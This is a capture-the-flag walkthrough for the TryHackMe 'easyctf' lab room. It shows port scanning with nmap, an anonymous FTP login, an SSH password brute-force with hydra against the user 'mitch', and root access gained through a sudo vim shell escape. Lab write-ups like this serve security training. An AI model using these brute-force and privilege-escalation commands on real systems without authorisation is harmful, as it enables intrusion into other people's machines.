THM-easyctf
https://tryhackme.com/room/easyctf

Use nmap to check for open ports: sudo nmap -Pn -p- -sS 10.10.38.83

PORT STATE SERVICE

21/tcp open ftp

80/tcp open http

2222/tcp open EtherNetIP-1

Log on to the ftp server as anonymous: ftp 10.10.38.83

cd pub directory and get ForMitch.txt

cat file:

 ℹ️ Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess! 
🔑 mitch could be a potential user name

Bruteforce the ssh server: hydra -l mitch -P /usr/share/dirb/wordlists/others/best110.txt ssh://10.10.38.83:2222

 *2222][ssh] host: 10.10.38.83   login: mitch   password: ******
Login to the ssh server: ssh mitch@10.10.38.83 -p 2222

🏴‍☠️ cat user.txt to get the first flag

sudo -l:

ℹ️ (root) NOPASSWD: /usr/bin/vim 
Head to https://gtfobins.github.io/gtfobins/vim/ to find shell access:

vim -c ':!/bin/sh'
sudo vim -c ':!/bin/sh'

root access is gained

cd to root directory

🏴‍☠️ cat root.txt for the final flag
